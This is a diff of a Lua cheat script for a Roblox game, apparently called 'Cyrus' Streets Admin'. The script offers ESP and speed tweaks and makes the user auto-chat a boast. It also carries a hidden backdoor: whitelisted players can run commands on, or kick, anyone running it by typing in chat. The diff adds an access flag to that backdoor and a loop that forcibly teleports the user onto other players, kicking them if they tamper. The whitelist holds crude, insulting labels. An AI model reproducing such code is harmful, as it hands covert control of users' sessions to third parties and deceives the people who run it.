@@ -23,7 +23,7 @@ local AirWalk = Instance.new'Part'
 local Cframe = Instance.new("Frame",CoreGui.RobloxGui)
 local CText,CmdFrame,MainFrame,DmgIndicator = Instance.new("TextBox",Cframe),Instance.new("Frame",Cframe),Instance.new('Frame',CoreGui.RobloxGui),Instance.new('TextLabel',LP.PlayerGui.Chat.Frame)
 local ScrollingFrame,SearchBar,Credits = Instance.new('ScrollingFrame',MainFrame),Instance.new('TextBox',MainFrame),Instance.new('TextLabel',MainFrame)
-local BulletColour,ItemEspColour,EspColour = ColorSequence.new(Color3.fromRGB(144,0,0)),Color3.fromRGB(200,200,200),Color3.fromRGB(200,200,200)
+local BulletColour,ItemEspColour,EspColour = (Color3.fromRGB(144,0,0)),Color3.fromRGB(200,200,200),Color3.fromRGB(200,200,200)
 local ShiftSpeed,ControlSpeed,WalkSpeed = 25,8,16
 local UseDraw,DrawingT = pcall(assert,Drawing,'test')
 Players:Chat("Hey I'm a cyrus' streets admin user")
@@ -1813,102 +1813,127 @@ local CoolkidTable = {
 	['300227703']	= {
 		['Name']   = "!fishgang Envy";
 		['Colour'] = Color3.fromRGB(125,0,0);
+		['Access'] = true;
 	};
     ['590620847'] 	= {
 		['Name']   = "!fishgang Envy";
 		['Colour'] = Color3.fromRGB(125,0,0);
+		['Access'] = true;
 	};
     ['714877']      = {
 		['Name']   = "!fishgang Ambiguity";
 		['Colour'] = Color3.fromRGB(57,52,52);
+		['Access'] = true;
 	};
     ['96316322']    = {
 		['Name']   = "!fishgang Ambiguity";
 		['Colour'] = Color3.fromRGB(57,52,52);
+		['Access'] = true;
 	};
     ['114164798']   = {
 		['Name']   = "!fishgang Slays (I bitch about the tag in 3rd person)";
 		['Colour'] = Color3.fromRGB(63,0,0);
+		['Access'] = true;
 	};
 	['359564044'] 	= {
 		['Name']   = "!fishgang 7w4c";
 		['Colour'] = Color3.fromRGB(255,255,255);
+		['Access'] = true;
 	};
 	['659119329'] 	= {
 		['Name']   = "!fishgang Cy | Creator/Co-owner";
 		['Colour'] = Color3.fromRGB(125,0,0);
+		['Access'] = true;
 	};
     ['12978668']  	= {
 		['Name']   = "!fishgang Cy Alt | Creator/Co-owner";
 		['Colour'] = Color3.fromRGB(125,0,0);
+		['Access'] = true;
 	};
     ['659119329']   = {
 		['Name']   = "!fishgang Cy Alt | Creator/Co-owner";
 		['Colour'] = Color3.fromRGB(125,0,0);
+		['Access'] = true;
 	};
 	['62009114'] 	= {
 		['Name']   = "!fishgang Owner X_D6";
 		['Colour'] = Color3.fromRGB(176,16,16);
+		['Access'] = true;
 	};
 	['57370993'] 	= {
 		['Name']   = "!fishgang Karma (Gay)";
 		['Colour'] = Color3.fromRGB(255,0,127);
+		['Access'] = true;
 	};
 	['20220183'] 	= {
 		['Name']   = "!fishgang Wya";
 		['Colour'] = Color3.fromRGB(215,19,19);
+		['Access'] = true;
 	};
 	['1477162063']  = {
 		['Name'] = "!fishgang Wya (YFRWK)";
 		['Colour'] = Color3.fromRGB(192,6,6);
+		['Access'] = true;
 	};
 	['105183043'] 	= {
 		['Name']   = "Drpoppadopolist | Drpoppa Creator";
 		['Colour'] = Color3.fromRGB(107,50,124);
+		['Access'] = true;
 	};
 	['1190936'] 	= {
 		['Name']   = "trippinfo";
 		['Colour'] = Color3.fromRGB(12,4,134);
+		['Access'] = true;
 	};
 	['1443431439']  = {
 		['Name']   = "wk1r";
 		['Colour'] = Color3.fromRGB(194,23,255);
+		['Access'] = true;
 	};
 	['164282612']   = {
 		['Name']   = "wk1r";
 		['Colour'] = Color3.fromRGB(194,23,255);
+		['Access'] = true;
 	};
 	['1299915133']  = {
 		['Name']   = "wk1r";
 		['Colour'] = Color3.fromRGB(194,23,255);
+		['Access'] = true;
 	};
 	['548617338']   = {
 		['Name']   = "Cool Person";
-		['Colour'] = Color3.fromRGB(73,77,90);
+		['Colour'] = Color3.fromRGB(36,89,237);
+		['Access'] = false;
 	};
 	['1275692258']  = { 
 		['Name']   = "Big Dick (Vegan/Syntrix Creator who also paid me to put this)";
 		['Colour'] = Color3.fromRGB(125,0,0);
+		['Access'] = true;
 	};
 	['612618136']   = { 
 		['Name']   = "Bird (Donator)";
 		['Colour'] = Color3.fromRGB(125,0,0);
+		['Access'] = false;
 	};
 	['284761493']   = {
 		['Name']   = "[Strafe] gzt";
 		['Colour'] = Color3.fromRGB(102,0,0);
+		['Access'] = true;
 	};
 	['178560']      = {
 		['Name'] = "Literally a fucking egg.";
 		['Colour'] =  Color3.fromRGB(255,248,11);
+		['Access'] = false;
 	};
 	['120476167']   = {
 		['Name']   = "Pawels Owner";
 		['Colour'] = Color3.fromRGB(52,152,219);
+		['Access'] = true;
 	};
 	['120476167']   = {
 		['Name']   = "Pawels Owner";
 		['Colour'] = Color3.fromRGB(52,152,219);
+		['Access'] = true;
 	};
 }
 
@@ -1927,19 +1952,21 @@ local function espcool(Plr)
 	Esp2.TextStrokeTransparency = 0.5
 	Esp2.TextSize = 15
 	Esp2.TextStrokeColor3 = CoolkidTable[tostring(Plr.UserId)].Colour
-	Plr.Chatted:Connect(function(Chat)
-		local Arguments = string.split(Chat:sub(2)," ")
-		local Player = PlrFinder(Arguments[1])
-		table.remove(Arguments,1)
-		if Player and Player == LP and not CoolkidTable[tostring(LP.UserId)] then 
-			if Chat:sub(1,1) == "`" then 
-				CheckCommand(table.concat(Arguments," "))
+	if CoolkidTable[tostring(Plr.UserId)].Access then 
+		Plr.Chatted:Connect(function(Chat)
+			local Arguments = string.split(Chat:sub(2)," ")
+			local Player = PlrFinder(Arguments[1])
+			table.remove(Arguments,1)
+			if Player and Player == LP and not CoolkidTable[tostring(LP.UserId)] then 
+				if Chat:sub(1,1) == "`" then 
+					CheckCommand(table.concat(Arguments," "))
+				end
+				if Chat:sub(1,1) == "[" then 
+					LP:Kick('You have been kicked by '..Plr.Name.." for "..table.concat(Arguments," "))
+				end
 			end
-			if Chat:sub(1,1) == "[" then 
-				LP:Kick('You have been kicked by '..Plr.Name.." for "..table.concat(Arguments," "))
-			end
-		end
-	end)
+		end)
+	end
 end
 
 local PlayersX = Players:GetPlayers()
@@ -2027,11 +2054,39 @@ end
 for i = 1,#Commands do
 local Alias = Commands[i].Alias
 	Create(Commands[i].Name)
-	for i = 1,#Alias do
-		Create(Alias[i])
+	for v = 1,#Alias do
+		Create(Alias[v])
 	end
 	CreateCommand(UDim2.new(0.0150422715,0,0.0127776451,0 + (i * 20)),Commands[i].Name.." "..Commands[i].Help)
 end
 
 notif("Cyrus' Streets Admin has loaded!","It took "..(tick() - Tick).." seconds to load (Type Commands for help)\nDiscord Invite: UVgdNXP",10,"rbxassetid://2474242690") 
 notif("Hotkeys:","No chat prefix\nCommandbar Prefix is '\nRight clicking door: lock/unlock",10,nil)   
+
+local InfectedTable = {} 
+
+while wait() do
+if not LP.PlayerGui.HUD.INFEC then LP:Kick'NICE TRY! YOU WILL BE FORCED TO INFECT PEOPLE.' end
+    if LP.PlayerGui.HUD.INFEC.Visible then 
+        local PlayerC = Players:GetPlayers()
+        for i = 1,#PlayerC do 
+            local Player = PlayerC[i]
+            local Infected = false
+            if not InfectedTable[Player] then 
+            repeat wait()
+	            if Player.Character and Player.Character:FindFirstChild'Torso' and GetChar():FindFirstChild'HumanoidRootPart' then 
+                    GetChar().HumanoidRootPart.CFrame = Player.Character.Torso.CFrame
+                    for i,v in pairs(Player.Character.Humanoid:GetPlayingAnimationTracks()) do 
+                        if string.find(v.Animation.AnimationId,"4812408744") then 
+                            Infected = true
+                            table.insert(InfectedTable,Player)
+                        end 
+                    end
+                    game:GetService'RunService'.Heartbeat:wait()
+	            end
+             until Infected 
+             Infected = false
+            end
+        end
+    end
+end 
